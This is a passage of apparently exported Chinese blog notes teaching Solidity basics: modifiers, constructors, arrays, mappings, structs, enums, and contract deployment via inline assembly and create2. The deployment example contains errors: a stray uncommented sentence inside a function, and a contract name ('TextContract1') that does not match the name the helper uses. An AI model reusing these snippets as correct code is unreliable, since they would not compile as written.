id="函数修改器知识"><a href="#函数修改器知识" class="headerlink" title="函数修改器知识"></a>函数修改器知识</h2><p>修饰器（modifier）是 solidity 特有的语法，它就像钢铁侠的智能盔甲，有特定功能，也可以控制访问权限。modifier 的主要使用场景是运行函数前的检查，例如地址，变量，余额等。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">contract functionmodifier&#123;<span class="comment">//函数修改器</span></span><br><span class="line">    <span class="type">bool</span> public paused;</span><br><span class="line">    uint public count;</span><br><span class="line">    function <span class="title function_">setPause</span><span class="params">(<span class="type">bool</span> _paused)</span>external&#123;</span><br><span class="line">        paused=_paused;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier <span class="title function_">whenpaused</span><span class="params">()</span>&#123;</span><br><span class="line">        require(!paused,<span class="string">&quot;paused&quot;</span>);</span><br><span class="line">        _;<span class="comment">//表示函数其他代码在哪里运行,既运行到下划线就会跳入函数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">inc</span><span class="params">()</span>external whenpaused&#123;</span><br><span class="line">        <span class="comment">//require(!paused,&quot;paused&quot;);把两个函数相同的require拿出来用函数修改器</span></span><br><span class="line">        count+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     function <span class="title function_">dec</span><span class="params">()</span>external whenpaused&#123;</span><br><span class="line">        <span class="comment">//require(!paused,&quot;paused&quot;);</span></span><br><span class="line">        count-=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">cap</span><span class="params">(uint x)</span>&#123;</span><br><span class="line">        require(x&lt;<span class="number">100</span>,<span class="string">&quot;x&gt;=100&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">incBy</span><span class="params">(uint x)</span>external whenpaused <span class="title function_">cap</span><span class="params">(x)</span>&#123;<span class="comment">//先检查第一个是否满足，然后传入入参数到第二个修改器进行判断</span></span><br><span class="line">        count+=x;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier <span class="title function_">sandwich</span><span class="params">()</span>&#123;<span class="comment">//三明治修改器</span></span><br><span class="line">        count +=<span class="number">10</span>;</span><br><span class="line">        _;</span><br><span class="line">        count *=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">foo</span><span class="params">()</span>external sandwich&#123;<span class="comment">//先加10，再加1，最后乘2；</span></span><br><span class="line">        count+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p>构造函数（constructor）是一种特殊的函数，每个合约可以定义一个，并在部署合约的时候自动运行一次。它可以用来初始化合约的一些参数，例如初始化合约的 owner 地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">contract Constructor&#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint public x;</span><br><span class="line">    constructor(uint _x)&#123;<span class="comment">//构造函数一般用于初始化变量,部署前传入_x的值</span></span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        x = _x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结1"><a href="#总结1" class="headerlink" title="总结1"></a>总结1</h2><p>前面内容的合成</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: HIT</span></span><br><span class="line">pragma solidity^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line">contract Ownable&#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier <span class="title function_">onlyOwnable</span><span class="params">()</span>&#123;</span><br><span class="line">        require(msg.sender==owner ,<span class="string">&quot;not owner&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">setowner</span><span class="params">(address _newOwner)</span>external onlyOwnable&#123;</span><br><span class="line">        require(_newOwner!=address(<span class="number">0</span>),<span class="string">&quot;invalid address&quot;</span>);</span><br><span class="line">        owner=_newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">onlyOwner</span><span class="params">()</span>external onlyOwnable&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">anyone</span><span class="params">()</span>external&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="returns的写法"><a href="#returns的写法" class="headerlink" title="returns的写法"></a>returns的写法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract functionoutput&#123;<span class="comment">//返回写法</span></span><br><span class="line">    function <span class="title function_">returnMany</span><span class="params">()</span>public pure <span class="title function_">returns</span> <span class="params">(uint , <span class="type">bool</span> )</span>&#123;</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">1</span>,<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">named</span><span class="params">()</span>public pure <span class="title function_">returns</span><span class="params">(uint x,<span class="type">bool</span> b)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">1</span>,<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">assigned</span><span class="params">()</span>public pure <span class="title function_">returns</span><span class="params">(uint x,<span class="type">bool</span> b)</span>&#123;</span><br><span class="line">        x=<span class="number">1</span>;b=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function  <span class="title function_">destructing</span><span class="params">()</span>public pure&#123;<span class="comment">//接收返回值</span></span><br><span class="line">        uint x;<span class="type">bool</span> b;</span><br><span class="line">        ( x , b )=returnMany();</span><br><span class="line">        (, b)=returnMany();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组的知识点"><a href="#数组的知识点" class="headerlink" title="数组的知识点"></a>数组的知识点</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">contract Array&#123;<span class="comment">//数组知识点</span></span><br><span class="line">    uint[]public nums=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];<span class="comment">//动态数组</span></span><br><span class="line">    uint[<span class="number">3</span>]public numsfixed=[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>];<span class="comment">//固定数组</span></span><br><span class="line">    uint public x;</span><br><span class="line">    uint public len;</span><br><span class="line">    </span><br><span class="line">    function <span class="title function_">examples</span><span class="params">()</span>external&#123;</span><br><span class="line">        nums.push(<span class="number">4</span>);   <span class="comment">//[1,2,3,4]</span></span><br><span class="line">         x=nums[<span class="number">1</span>];</span><br><span class="line">        nums[<span class="number">2</span>]=<span class="number">777</span>;   <span class="comment">//[1,2,777,4]</span></span><br><span class="line">        delete nums[<span class="number">1</span>];  <span class="comment">//[1,0,777,4]</span></span><br><span class="line">        nums.pop();  <span class="comment">//[1,0,777]</span></span><br><span class="line">        len=nums.length;  <span class="comment">//数组长度</span></span><br><span class="line">        uint []memory a=new uint[](<span class="number">5</span>);  <span class="comment">//内存中只能固定数组，不能用上面内容</span></span><br><span class="line">        a[<span class="number">1</span>]=<span class="number">123</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">returnarray</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint[] memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> nums; <span class="comment">//返回数组所有的元素</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组的删除函数"><a href="#数组的删除函数" class="headerlink" title="数组的删除函数"></a>数组的删除函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract ArrayShift&#123;</span><br><span class="line">    uint []public arr;</span><br><span class="line">    function <span class="title function_">example</span><span class="params">()</span>public &#123;</span><br><span class="line">        arr=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">        delete arr[<span class="number">1</span>];<span class="comment">//[1,0,3]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//[1,2,3]--remove(1)--&gt;[1,3,3]--&gt;[1,3]</span></span><br><span class="line">    function <span class="title function_">remove</span><span class="params">(uint _index)</span>public&#123;<span class="comment">//闪出数组中的元素</span></span><br><span class="line">        require(_index&lt;arr.length,<span class="string">&quot;index out of bound&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(uint i=_index;i&lt;arr.length<span class="number">-1</span>;i++)&#123;</span><br><span class="line">            arr[i]=arr[i+<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        arr.pop();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract Mapping&#123;</span><br><span class="line">    uint bal;</span><br><span class="line">    uint bal2;</span><br><span class="line">    mapping(address =&gt;uint)public balances;</span><br><span class="line">    mapping(address=&gt;mapping(address=&gt;<span class="type">bool</span>))public isFriend;</span><br><span class="line">    function <span class="title function_">examples</span><span class="params">()</span>external&#123;</span><br><span class="line">        balances[msg.sender]=<span class="number">123</span>;</span><br><span class="line">        bal =balances[msg.sender];</span><br><span class="line">        bal2=balances[address(<span class="number">1</span>)];<span class="comment">//默认 0</span></span><br><span class="line">        balances[msg.sender]+=<span class="number">456</span>;</span><br><span class="line">        delete balances[msg.sender];<span class="comment">//delete并不是删除，而是回归默认值</span></span><br><span class="line">        isFriend[msg.sender][address(this)]=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="映射与数组的结合，高价值"><a href="#映射与数组的结合，高价值" class="headerlink" title="映射与数组的结合，高价值"></a>映射与数组的结合，高价值</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">contract iterableMapping&#123;<span class="comment">//将数组与映射结合</span></span><br><span class="line">    mapping(address=&gt;uint)public balances;</span><br><span class="line">    mapping(address=&gt;<span class="type">bool</span>)public inserted;</span><br><span class="line">    address[]public keys;</span><br><span class="line">    function <span class="title function_">set</span><span class="params">(address _key,uint _val)</span>external&#123;</span><br><span class="line">        balances[_key]=_val;</span><br><span class="line">        <span class="keyword">if</span>(!inserted[_key])&#123;</span><br><span class="line">            inserted[_key]=<span class="literal">true</span>;</span><br><span class="line">            keys.push(_key);<span class="comment">//增加地址到数组，从而实现遍历</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">getsize</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> keys.length;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">first</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> balances[keys[<span class="number">0</span>]];<span class="comment">//第一个地址的余额</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">last</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> balances[keys[keys.length<span class="number">-1</span>]];<span class="comment">//最后一个地址的余额</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">get</span><span class="params">(uint i)</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> balances[keys[i]];<span class="comment">//任意一个地址的余额</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="结构体的定义方法与数组组合"><a href="#结构体的定义方法与数组组合" class="headerlink" title="结构体的定义方法与数组组合"></a>结构体的定义方法与数组组合</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">contract Struct&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Car</span>&#123;</span></span><br><span class="line">        <span class="built_in">string</span> model;</span><br><span class="line">        uint year;</span><br><span class="line">        address owner;</span><br><span class="line">    &#125;</span><br><span class="line">    Car public car;</span><br><span class="line">    Car[] public cars;<span class="comment">//可通过这里查看数组</span></span><br><span class="line">    mapping(address =&gt;Car[])public carsByOwner;</span><br><span class="line">    function <span class="title function_">examples</span><span class="params">()</span>external&#123;</span><br><span class="line">        Car memory toyota=Car(<span class="string">&quot;Toyota&quot;</span>,<span class="number">1990</span>,msg.sender);</span><br><span class="line">        Car memory lambo=Car(&#123;year:<span class="number">1980</span>,model:<span class="string">&quot;Lamborghini&quot;</span>,owner:msg.sender&#125;);<span class="comment">//顺序可换换</span></span><br><span class="line">        Car memory tesla;</span><br><span class="line">        tesla.model=<span class="string">&quot;Tesla&quot;</span>;</span><br><span class="line">        tesla.year=<span class="number">2010</span>;</span><br><span class="line">        tesla.owner=msg.sender;</span><br><span class="line">        cars.push(toyota);</span><br><span class="line">        cars.push(lambo);</span><br><span class="line">        cars.push(tesla);</span><br><span class="line">        cars.push(Car(<span class="string">&quot;Ferrari&quot;</span>,<span class="number">2020</span>,msg.sender));</span><br><span class="line">        Car storage _car=cars[<span class="number">0</span>];</span><br><span class="line">        _car.year=<span class="number">1999</span>;</span><br><span class="line">        delete _car.owner;</span><br><span class="line">        delete cars[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="枚举的用法"><a href="#枚举的用法" class="headerlink" title="枚举的用法"></a>枚举的用法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">contract Enum&#123;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">Status</span>&#123;</span></span><br><span class="line">        None,</span><br><span class="line">        Pending,</span><br><span class="line">        Shipped,</span><br><span class="line">        Completed,</span><br><span class="line">        Rejected,</span><br><span class="line">        Canceled</span><br><span class="line">    &#125;<span class="comment">//分别对应 0，1，2，3，4，5</span></span><br><span class="line">    Status public status;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Order</span>&#123;</span></span><br><span class="line">        address buyer;</span><br><span class="line">        Status status;</span><br><span class="line">    &#125;</span><br><span class="line">    Order[]public orders;</span><br><span class="line">    function <span class="title function_">get</span><span class="params">(Status _status)</span> external <span class="title function_">returns</span><span class="params">(Status)</span>&#123;<span class="comment">//输入枚举的序号，得到枚举的序号</span></span><br><span class="line">        status=_status;</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">ship</span><span class="params">()</span>external&#123;</span><br><span class="line">        status=Status.Shipped;<span class="comment">//调用后得到2；</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">reset</span><span class="params">()</span>external&#123;</span><br><span class="line">        delete status;<span class="comment">//删除，变成默认值0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="通过内联汇编部署合约-懵点"><a href="#通过内联汇编部署合约-懵点" class="headerlink" title="通过内联汇编部署合约(懵点)"></a>通过内联汇编部署合约(懵点)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">contract TextContract1&#123;</span><br><span class="line">    address public owner=msg.sender;</span><br><span class="line">    function <span class="title function_">setOwner</span><span class="params">(address _owner)</span>public&#123;</span><br><span class="line">        require(msg.sender==owner,<span class="string">&quot;not owner&quot;</span>);</span><br><span class="line">        owner=_owner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TestContract2&#123;</span><br><span class="line">    address public owner=msg.sender;</span><br><span class="line">    uint public value=msg.value;</span><br><span class="line">    uint public x;</span><br><span class="line">    uint public y;</span><br><span class="line">    constructor(uint _x,uint _y)&#123;</span><br><span class="line">        x=_x;</span><br><span class="line">        y=_y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//代理合约，用来部署合约1和2</span></span><br><span class="line">contract Proxy&#123;</span><br><span class="line">    event <span class="title function_">Deploy</span><span class="params">(address)</span>;</span><br><span class="line">    function <span class="title function_">deploy</span><span class="params">(bytes memory _code)</span>external payable <span class="title function_">returns</span><span class="params">(address addr)</span>&#123;<span class="comment">//隐式返回：returns后面定义了名称，自动返回</span></span><br><span class="line">        <span class="comment">//获得部署合约的地址</span></span><br><span class="line">        assembly&#123;<span class="comment">//内联汇编</span></span><br><span class="line">            <span class="comment">//create(v,p,n)</span></span><br><span class="line">            <span class="comment">//v代表部署合约发送的币的数量  通过callvalue获取</span></span><br><span class="line">            <span class="comment">//p代表内存中机器码开始的位置  通过add(_code,0x20)跳跃</span></span><br><span class="line">            <span class="comment">//n代表机器码内存的大小  通过mload(_code)获取</span></span><br><span class="line">            addr :=create(callvalue(),add(_code,<span class="number">0x20</span>),mload(_code))<span class="comment">//msg.value在这里不行</span></span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">        require(addr!=address(<span class="number">0</span>),<span class="string">&quot;deploy failed&quot;</span>); <span class="comment">//判断是否部署成功</span></span><br><span class="line">        emit <span class="title function_">Deploy</span><span class="params">(addr)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//通过date来呼叫另一个合约中的函数</span></span><br><span class="line">    function <span class="title function_">execute</span><span class="params">(address _target,bytes memory _date)</span>external payable&#123;</span><br><span class="line">        (<span class="type">bool</span> success, )=_target.call&#123;value:msg.value&#125;(_date);</span><br><span class="line">        require(success,<span class="string">&quot;failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//助手合约，用来得到合约1和2或者合约中函数的code</span></span><br><span class="line">contract Helper&#123;</span><br><span class="line">    <span class="comment">//获取呼叫合约1的代码</span></span><br><span class="line">    function <span class="title function_">getBytecode1</span><span class="params">()</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">        bytes memory bytecode=type(TestContract1).creationCode;<span class="comment">//特定方法type(合约名称).creationCode</span></span><br><span class="line">        <span class="keyword">return</span> bytecode;</span><br><span class="line">        没有构造函数时用此方法获得bytecode;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取呼叫合约2的代码</span></span><br><span class="line">    function <span class="title function_">getBytecode2</span><span class="params">(uint _x,uint _y)</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">        bytes memory bytecode=type(TestContract2).creationCode;<span class="comment">//特定方法</span></span><br><span class="line">        <span class="keyword">return</span> abi.encodePacked(bytecode,abi.encode(_x,_y)); <span class="comment">//通过将传入的参数与bytecode打包生成新的bytecode</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取呼叫合约1中setOwner的所需要的date</span></span><br><span class="line">    function <span class="title function_">getCalldate</span><span class="params">(address _owner)</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;<span class="comment">//_owner为传入合约1中函数的参数</span></span><br><span class="line">        <span class="keyword">return</span> abi.encodeWithSignature(<span class="string">&quot;setOwner(address)&quot;</span>,_owner);<span class="comment">//特定方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用create2来构造函数（可提前预测生成的地址）"><a href="#用create2来构造函数（可提前预测生成的地址）" class="headerlink" title="用create2来构造函数（可提前预测生成的地址）"></a>用create2来构造函数（可提前预测生成的地址）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line">contract DeployWithCreate2&#123;</span><br><span class="line">  address public owner;</span><br><span class="line">  constructor(address _owner)&#123;</span><br><span class="line">    owner=_owner;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Create2Factory&#123;</span><br><span class="line">  event <span class="title function_">Deploy</span><span class="params">(address addr)</span>;</span><br><span class="line">  function <span class="title function_">deploy</span><span class="params">(uint _salt)</span>external&#123;</span><br><span class="line">    DeployWithCreate2 _contract=new DeployWithCreate2&#123;</span><br><span class="line">      salt:bytes32(_salt)</span><br><span class="line">    &#125;(msg.sender);<span class="comment">//create2方法相对于原来的方法只需加个大括号</span></span><br><span class="line">    emit <span class="title function_">Deploy</span><span class="params">(address(_contract))</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//计算合约地址的方法</span></span><br><span class="line">  function <span class="title function_">getAddress</span><span class="params">(bytes memory bytecode,uint _salt)</span>public view <span class="title function_">returns</span><span class="params">(address)</span></span><br><span class="line">  &#123;</span><br><span class="line">    bytes32 hash=keccak256(abi.encodePacked(</span><br><span class="line">      bytes1(<span class="number">0xff</span>),address(this),_salt,keccak256(bytecode)</span><br><span class="line">    ));</span><br><span class="line">    <span class="keyword">return</span> address(uint160(uint(hash)));</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//计算bytecode</span></span><br><span class="line">  function <span class="title function_">getBytecode</span><span class="params">(address _owner)</span>public pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">    bytes memory bytecode=type(DeployWithCreate2).creationCode;</span><br><span class="line">    <span class="keyword">return</span> abi.encodePacked(bytecode,abi.encode(_owner));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -solidity学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>solidity基础攻击</title>
      <link href="/2022/10/28/solidity/%E6%9D%82%E4%B9%B1/solidity%E5%9F%BA%E7%A1%80%E6%94%BB%E5%87%BB/"/>
      <url>/2022/10/28/solidity/%E6%9D%82%E4%B9%B1/solidity%E5%9F%BA%E7%A1%80%E6%94%BB%E5%87%BB/</url>
      
